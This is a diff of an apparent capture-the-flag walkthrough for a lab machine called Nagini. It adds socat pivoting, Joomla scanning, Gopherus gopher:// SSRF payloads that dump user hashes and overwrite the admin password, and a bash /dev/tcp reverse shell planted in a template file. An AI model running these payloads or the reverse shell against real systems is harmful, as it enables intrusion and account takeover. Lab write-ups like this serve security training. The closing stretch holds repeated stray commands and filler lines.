@@ -1043,7 +1043,7 @@ give it execution permissions
 chmod +x socat
 ```
 
-execute it from the reverse shell
+execute it from the reverse shell (i recommend you to open a new terminal of hagrid98 with sudo privileges)
 
 ```
 bash-5.0# ./socat TCP-LISTEN:4343,fork TCP:192.168.100.53:80 
@@ -1066,49 +1066,626 @@ going back to the port 80 of 10.10.0.137
 we have to request to the local host the information from our machine which is listining at 192.168.100.53:80 (remeber that this is possible because it's 
 is vulnerable to ssrf)
 
-in the search bar we have to search this 
+in the search bar we have to search this (the ip of hagrid98 because there's the socat tunneling)
 
 ```bash
-http://10.10.0.128:4343
+http://10.10.0.137:4343
 ```
-and seems that it does not work because, it's not interpreting php code 
+and seems that it works nevetheless it's not interpreting php code, because i was trying to upload a command line using php
+```php
+<?
+system("whoami")
+?>
+```
+checking the page it's not interpreting php code
+```php
+<html>
+<head>
+	<title>Resource Fetching Page</title>
+	<meta charset="utf-8">
+</head>
+<body>
+	<center><h1>Welcome to Internal Network Resource Fetching Page</h1></center>
+	<br><br>
+
+	<form action="/internalResourceFeTcher.php" method="GET">
+	<center><input type="text" name="url" value="" id='url'>
+	<input type="submit" value="Fetch"></center>
+	</form>
+</body>
+
+```
+
 
 let's check joomla service that we found with gobuzzter
 
+to check if it has vulnerabilities let's use [jomcheck](https://github.com/rezasp/joomscan.git)
+
+
+```bash
+git clone https://github.com/rezasp/joomscan.git
+cd joomscan
+perl joomscan.pl
+```
+now let's use it 
+
+```bash
+$ proxychains perl joomscan.pl -u http://10.10.0.137/joomla/ 2>&/dev/null
+```
+
+Where.:
+
+- ```-proxychains``` :in order to use the  tunneling made on port 1080 using chisel client + chisel server on port 1080.
+- ```-u``` : We will run all relevant scripts (provided by nmap) on these ports.
+- ```-2>&/dev/null```: readict all error output to de/null which is like a black hole
+
+output
 
 
 
 ```bash
-hades@symfonos3: cd /root
-hades@symfonos3: ls
-proof.txt
-hades@symfonos3: cat proof.txt
+ ____  _____  _____  __  __  ___   ___    __    _  _ 
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+			(1337.today)
+   
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
 
-        Congrats on rooting symfonos:3!
-                                        _._
-                                      _/,__\,
-                                   __/ _/o'o
-                                 /  '-.___'/  __
-                                /__   /\  )__/_))\
-     /_/,   __,____             // '-.____|--'  \\
-    e,e / //  /___/|           |/     \/\        \\
-    'o /))) : \___\|          /   ,    \/         \\
-     -'  \\__,_/|             \/ /      \          \\
-             \_\|              \/        \          \\
-             | ||              <    '_    \          \\
-             | ||             /    ,| /   /           \\
-             | ||             |   / |    /\            \\
-             | ||              \_/  |   | |             \\
-             | ||_______________,'  |__/  \              \\
-              \|/_______________\___/______\_             \\
-               \________________________     \__           \\        ___
-                  \________________________    _\_____      \\ _____/
-                     \________________________               \\
-        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
-            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //
+Processing http://10.10.0.137/joomla/ ...
 
-        Contact me via Twitter @zayotic to give feedback!
 
-#
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.9.25
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://10.10.0.137/joomla/administrator/components
+http://10.10.0.137/joomla/administrator/modules
+http://10.10.0.137/joomla/administrator/templates
+http://10.10.0.137/joomla/tmp
+http://10.10.0.137/joomla/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://10.10.0.137/joomla/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is found
+path : http://10.10.0.137/joomla/robots.txt 
+
+Interesting path found from robots.txt
+http://10.10.0.137/joomla/joomla/administrator/
+http://10.10.0.137/joomla/administrator/
+http://10.10.0.137/joomla/bin/
+http://10.10.0.137/joomla/cache/
+http://10.10.0.137/joomla/cli/
+http://10.10.0.137/joomla/components/
+http://10.10.0.137/joomla/includes/
+http://10.10.0.137/joomla/installation/
+http://10.10.0.137/joomla/language/
+http://10.10.0.137/joomla/layouts/
+http://10.10.0.137/joomla/libraries/
+http://10.10.0.137/joomla/logs/
+http://10.10.0.137/joomla/modules/
+http://10.10.0.137/joomla/plugins/
+http://10.10.0.137/joomla/tmp/
+
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config file is found 
+ config file path : http://10.10.0.137/joomla/configuration.php.bak
+
+
+
+Your Report : reports/10.10.0.137/
+
 ```
+
+important output
+Interesting path found from robots.txt
+http://10.10.0.137/joomla/joomla/administrator/
+http://10.10.0.137/joomla/administrator/
+http://10.10.0.137/joomla/bin/
+http://10.10.0.137/joomla/cache/
+http://10.10.0.137/joomla/cli/
+http://10.10.0.137/joomla/components/
+http://10.10.0.137/joomla/includes/
+http://10.10.0.137/joomla/installation/
+http://10.10.0.137/joomla/language/
+http://10.10.0.137/joomla/layouts/
+http://10.10.0.137/joomla/libraries/
+http://10.10.0.137/joomla/logs/
+http://10.10.0.137/joomla/modules/
+http://10.10.0.137/joomla/plugins/
+http://10.10.0.137/joomla/tmp/
+
+another very strong point to mention is 
+
+ config file path : http://10.10.0.137/joomla/configuration.php.bak
+
+let's check it on port 80 remember to turn on the FoxyProxy
+
+in this file we figure out a few things, this loggin panel and
+
+```bash
+in port 80 Interesting path found from robots.txt
+http://10.10.0.137/joomla/joomla/administrator/
+http://10.10.0.137/joomla/administrator/
+```
+
+a possible credentials in the http://10.10.0.137/joomla/configuration.php.bak
+
+
+```php
+❯ cat configuration.php.bak
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: configuration.php.bak
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ <?php
+   2   │ class JConfig {
+   3   │     public $offline = '0';
+   4   │     public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+   5   │     public $display_offline_message = '1';
+   6   │     public $offline_image = '';
+   7   │     public $sitename = 'Joomla CMS';
+   8   │     public $editor = 'tinymce';
+   9   │     public $captcha = '0';
+  10   │     public $list_limit = '20';
+  11   │     public $access = '1';
+  12   │     public $debug = '0';
+  13   │     public $debug_lang = '0';
+  14   │     public $debug_lang_const = '1';
+  15   │     public $dbtype = 'mysqli';
+  16   │     public $host = 'localhost';
+  17   │     public $user = 'goblin';
+  18   │     public $password = '';
+  19   │     public $db = 'joomla';
+  20   │     public $dbprefix = 'joomla_';
+  21   │     public $live_site = '';
+  22   │     public $secret = 'ILhwP6HTYKcN7qMh';
+  23   │     public $gzip = '0';
+  24   │     public $error_reporting = 'default';
+  25   │     public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
+  26   │     public $ftp_host = '';
+  27   │     public $ftp_port = '';
+  28   │     public $ftp_user = '';
+  29   │     public $ftp_pass = '';
+  30   │     public $ftp_root = '';
+  31   │     public $ftp_enable = '0';
+  32   │     public $offset = 'UTC';
+  33   │     public $mailonline = '1';
+  34   │     public $mailer = 'mail';
+  35   │     public $mailfrom = 'site_admin@nagini.hogwarts';
+  36   │     public $fromname = 'Joomla CMS';
+  37   │     public $sendmail = '/usr/sbin/sendmail';
+  38   │     public $smtpauth = '0';
+  39   │     public $smtpuser = '';
+  40   │     public $smtppass = '';
+  41   │     public $smtphost = 'localhost';
+  42   │     public $smtpsecure = 'none';
+  43   │     public $smtpport = '25';
+  44   │     public $caching = '0';
+  45   │     public $cache_handler = 'file';
+  46   │     public $cachetime = '15';
+  47   │     public $cache_platformprefix = '0';
+  48   │     public $MetaDesc = '';
+  49   │     public $MetaKeys = '';
+  50   │     public $MetaTitle = '1';
+  51   │     public $MetaAuthor = '1';
+  52   │     public $MetaVersion = '0';
+  53   │     public $robots = '';
+  54   │     public $sef = '1';
+  55   │     public $sef_rewrite = '0';
+  56   │     public $sef_suffix = '0';
+  57   │     public $unicodeslugs = '0';
+  58   │     public $feed_limit = '10';
+  59   │     public $feed_email = 'none';
+  60   │     public $log_path = '/var/www/html/joomla/administrator/logs';
+  61   │     public $tmp_path = '/var/www/html/joomla/tmp';
+  62   │     public $lifetime = '15';
+  63   │     public $session_handler = 'database';
+  64   │     public $shared_session = '0';
+  65   │ }
+───────┴───
+```
+seems that we have sql user, we can actually take an adventage of the ssrf, because if we use gopherus we can dig in to the data bases, this works only if the databases, don't have the password set it, let's figure out
+
+let's install gopherus 
+get it from [github](https://github.com/tarunkant/Gopherus)
+
+```bash
+❯ git clone https://github.com/tarunkant/Gopherus
+Clonando en 'Gopherus'...
+remote: Enumerating objects: 137, done.
+remote: Counting objects: 100% (15/15), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 137 (delta 12), reused 11 (delta 11), pack-reused 122
+Recibiendo objetos: 100% (137/137), 285.89 KiB | 510.00 KiB/s, listo.
+Resolviendo deltas: 100% (65/65), listo.
+```
+
+installation
+
+
+```bash
+❯ ./install.sh
+/usr/bin/python2: No module named pip
+/usr/bin/python2: No module named pip
+```
+in case you don't have pip2 module let's install it
+
+```bash
+❯ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
+sudo python2 get-pip.py
+```
+now let's install it 
+```bash
+❯ ./install.sh
+```
+usage
+
+we just have to send te command gopherus  in this case we saw that is SQL, but gopherus support mysql, postgresql, fastcgi, redis, smtp, zabbix etc.
+
+```bash
+❯ gopherus
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+		author: $_SpyD3r_$
+
+usage: gopherus [-h] [--exploit EXPLOIT]
+
+optional arguments:
+  -h, --help         show this help message and exit
+  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
+                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
+None
+
+```
+we have to select mysql in this case Gopherus will ask us the username for the data bases in our case is goblin because of the archive.bak
+
+```bash
+❯ gopherus --exploit mysql
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+		author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: 
+```
+
+after we select the username gopherus will ask us for the query to execute. as usual we need to know first of all, the databases so we will ask gopherus to make a URL to explete the SSRF
+
+```bash
+❯ gopherus --exploit mysql
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+		author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: goblin
+Give query to execute: SHOW databases;
+
+Your gopher link is ready to do SSRF : 
+
+gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%53%48%4f%57%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01
+
+-----------Made-by-SpyD3r-----------
+```
+we will take the url that gopherus provide us and paste it in the search bar on the ssrf that we saw before in /internalResourceFeTcher.php(remember  to turn on the foxyProxy)
+
+output (to make it work it we have to recharge the page like 7 times, FYI) it's normal in this kind of SSRF)
+```bash
+information_schemajoomla
+```
+
+so we can enumerate the databases let's follow our metodology, now we have to get the tables, we have to use the joomla databases to enumerate the tables
+
+```bash
+❯ gopherus --exploit mysql
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+		author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: goblin
+Give query to execute: USE joomla; show tables;
+
+Your gopher link is ready to do SSRF : 
+
+gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01
+
+output
+c 5.5.5-10.3.27-MariaDB-0+deb10u1M0{=]>[1#��-��Ywl9rU3?!)Fgmysql_native_password @ joomlaXdefinformation_schemaTABLE_NAMESTABLE_NAMESTables_in_joomla 
+
+TABLE_NAME!��joomla_action_log_configjoomla_action_logsjoomla_action_logs_extensionsjoomla_action_logs_users joomla_assets joomla_associations joomla_banner_clientsjoomla_banner_tracksjoomla_banners joomla_categoriesjoomla_contact_detailsjoomla_contentjoomla_content_frontpagejoomla_content_ratingjoomla_content_typesjoomla_contentitem_tag_mapjoomla_core_log_searchesjoomla_extensions joomla_fieldsjoomla_fields_categoriesjoomla_fields_groupsjoomla_fields_valuesjoomla_finder_filtersjoomla_finder_linksjoomla_finder_links_terms0joomla_finder_links_terms1joomla_finder_links_terms2joomla_finder_links_terms3 joomla_finder_links_terms4!joomla_finder_links_terms5"joomla_finder_links_terms6#joomla_finder_links_terms7$joomla_finder_links_terms8%joomla_finder_links_terms9&joomla_finder_links_termsa'joomla_finder_links_termsb(joomla_finder_links_termsc)joomla_finder_links_termsd*joomla_finder_links_termse+joomla_finder_links_termsf,joomla_finder_taxonomy-joomla_finder_taxonomy_map.joomla_finder_terms/joomla_finder_terms_common0joomla_finder_tokens1joomla_finder_tokens_aggregate2joomla_finder_types3joomla_languages4joomla_menu5joomla_menu_types6joomla_messages7joomla_messages_cfg8joomla_modules9joomla_modules_menu:joomla_newsfeeds;joomla_overrider<joomla_postinstall_messages=joomla_privacy_consents>joomla_privacy_requests?joomla_redirect_links@joomla_schemasAjoomla_sessionBjoomla_tagsCjoomla_template_stylesDjoomla_ucm_baseEjoomla_ucm_contentFjoomla_ucm_historyGjoomla_update_sitesHjoomla_update_sites_extensionsIjoomla_updatesJjoomla_user_keysKjoomla_user_notesLjoomla_user_profilesMjoomla_user_usergroup_mapNjoomla_usergroups Ojoomla_usersPjoomla_utf8_conversionQjoomla_viewlevelsR�"
+
+important we have to enumerate the joomla_users to enumerate the users for the table joomla 
+
+```
+now let's get the columns 
+
+```bash
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+		author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: goblin
+Give query to execute: USE joomla; describe joomla_users;
+
+Your gopher link is ready to do SSRF : 
+
+gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%23%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%64%65%73%63%72%69%62%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01
+
+-----------Made-by-SpyD3r-----------
+
+
+```
+for the data will be 
+```bash
+❯ gopherus --exploit mysql
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+		author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: goblin
+Give query to execute: USE joomla; select name,username,email,password from joomla_users;
+
+Your gopher link is ready to do SSRF : 
+
+gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%43%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%6e%61%6d%65%2c%75%73%65%72%6e%61%6d%65%2c%65%6d%61%69%6c%2c%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01
+
+```
+we found the password and the user for this database but we found a password hashed let's try to Bruteforce it with john 
+
+
+```bash
+�n Super User site_adminsite_admin@nagini.hogwarts<$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay�"
+```
+how to bruteForce it using john 
+
+
+
+```bash
+❯ john -w:rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:06:48 0,23% (ETA: 2023-04-26 21:39) 0g/s 98.89p/s 98.89c/s 98.89C/s abygail..DYLAN
+Session aborted
+```
+
+but we will unable to bruteforce it nevertheless, we can watch data from joomla_users let's try to manipulate first of all we need to create a hash with md5sum example
+
+a
+```bash
+❯ echo -n "contra123" | md5sum
+2109273d6457e96abbe8fb88bf62c074
+```
+now let's play with gophirus to change the password for user "site_admin"
+
+a
+```bash
+❯ gopherus --exploit mysql
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+		author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: goblin
+Give query to execute: Use joomla; update joomla_users set password='2109273d6457e96abbe8fb88bf62c074' where username='site_admin';
+
+Your gopher link is ready to do SSRF : 
+
+gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%55%73%65%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%32%31%30%39%32%37%33%64%36%34%35%37%65%39%36%61%62%62%65%38%66%62%38%38%62%66%36%32%63%30%37%34%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01
+
+it worked  c 5.5.5-10.3.27-MariaDB-0+deb10u1][(VX7GAN��-��FQHRFGnw-u+qmysql_native_password @ joomla0(Rows matched: 1 Changed: 0 Warnings: 0
+
+
+```
+
+let's try it in the loggin panel 
+```bash
+crendials=site_admin:contra123
+```
+
+and it worked 
+
+let's explote joomla 
+
+## Gaining Access | 10.10.0.137
+
+when you are in a joomla panel the gaining access if easy because if you go at extensions >> templates>> select propostar template >> and you edit the error.php
+
+if you edit it and if you add a php malisius code if you generate an error joomla will read your malisius code in my case i will add a reverse shell in php format and i will generate an error using the index.php
+
+remember to use socat in order to tell them that fork all info that comes from 10.10.0.137 send it to my own machine 
+
+example 
+go to 
+
+```bash
+extensions >> templates>> select propostar template >> and you edit the error.php 
+```
+add your reverse shell 
+
+```bash
+system("bash -c 'bash -i >& /dev/tcp/10.10.0.136/1111 0>&1'");
+```
+
+save it and stay listen with nc -nlpv 443
+
+with socat as well
+
+```bash
+^Croot@Aragog:/dev/shm# ./socat TCP-LISTEN:1111,fork TCP:192.168.100.53:443
+```
+
+and generate an error using the index.php on the joomla 
+
+```bash
+http://10.10.0.137/joomla/index.php/<>
+```
+
+whoami 
+
+
+```bash
+www-data@Nagini:/var/www/html/joomla$ whoami
+www-data
+```
+
+# Privilage Escalation | 10.10.0.137
+
+
+```bash
+www-data@Nagini:/var/www/html/joomla$ whoami
+www-data
+```
+asd
+```bash
+www-data@Nagini:/$ cd /home/
+www-data@Nagini:/home$ ls
+hermoine  snape
+www-data@Nagini:/home$ cd snape/
+www-data@Nagini:/home/snape$ ls
+www-data@Nagini:/home/snape$ ls -la
+total 32
+drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
+drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
+-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
+-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
+-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
+drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
+-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
+drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
+www-data@Nagini:/home/snape$ 
+```
+let's check it 
+```bash
+www-data@Nagini:/$ cd /home/
+www-data@Nagini:/home$ ls
+hermoine  snape
+www-data@Nagini:/home$ cd snape/
+www-data@Nagini:/home/snape$ ls
+www-data@Nagini:/home/snape$ ls -la
+total 32
+drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
+drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
+-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
+-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
+-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
+drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
+-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
+drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
+www-data@Nagini:/home/snape$ cat .creds.txt 
+TG92ZUBsaWxseQ==
+www-data@Nagini:/home/snape$ echo "TG92ZUBsaWxseQ==" | base64 -d;echo            
+Love@lilly
+www-data@Nagini:/home/snape$ su snape
+Password: 
+snape@Nagini:~$ whoami
+snape
+snape@Nagini:~$ 
+```
+user pivoting 
+```bash
+❯ ./install.sh
+```
+
+a
+```bash
+❯ ./install.sh
+```
+
+```bash
+❯ ./install.sh
+```
+a
+```bash
+❯ ./install.sh
+```
+a
+```bash
+❯ ./install.sh
+```
+
 Happy hacking !
